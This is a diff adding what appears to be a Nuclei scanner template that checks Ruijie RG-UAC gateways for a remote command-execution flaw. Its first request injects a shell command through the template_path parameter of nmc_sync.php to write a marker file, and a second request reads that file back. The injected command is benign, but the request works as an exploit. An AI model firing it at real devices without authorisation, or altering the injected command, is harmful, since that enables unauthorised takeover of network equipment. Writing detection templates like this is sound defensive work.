@@ -1,0 +1,31 @@
+id: Ruijie_RG_UAC_gateway_Rce
+
+info:
+  name: Ruijie_RG_UAC_gateway_Rce
+  author: pitaya
+  severity: high
+  
+variables:
+  filename: "{{to_lower(rand_base(20))}}"
+  
+http:
+  - raw:
+      - |+
+        GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo%20SecExplorer666%20>{{filename}}.txt|cat HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+      - |+
+        GET /view/systemConfig/management/{{filename}}.txt HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains(body_2, "SecExplorer666")'
